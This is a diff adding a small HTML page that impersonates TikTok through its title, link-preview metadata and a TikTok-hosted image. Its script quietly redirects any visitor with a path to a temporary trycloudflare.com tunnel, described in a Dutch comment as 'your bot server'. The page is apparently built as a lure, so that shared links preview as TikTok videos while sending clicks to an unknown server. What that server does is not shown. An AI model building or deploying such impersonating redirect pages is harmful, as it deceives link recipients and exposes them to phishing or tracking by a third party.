@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="nl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TikTok - Watch Videos</title>
+    <meta property="og:title" content="TikTok - Watch Videos" />
+    <meta property="og:description" content="Watch awesome videos on TikTok" />
+    <meta
+      property="og:image"
+      content="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/8152caf0c8e8bc67ae0d.png"
+    />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+        background: #000;
+        color: white;
+      }
+      .loading {
+        display: inline-block;
+        width: 50px;
+        height: 50px;
+        border: 5px solid #333;
+        border-top: 5px solid #fff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="loading"></div>
+    <script>
+      // Haal de short code uit de URL
+      const path = window.location.pathname;
+      const shortCode = path.split("/")[1];
+
+      if (shortCode) {
+        // Redirect naar je bot server
+        const targetUrl =
+          "https://circuit-repair-announcements-artificial.trycloudflare.com" +
+          path;
+        window.location.href = targetUrl;
+      } else {
+        document.body.innerHTML =
+          '<div style="text-align:center"><h1>test</h1><p>Not found</p></div>';
+      }
+    </script>
+  </body>
+</html>
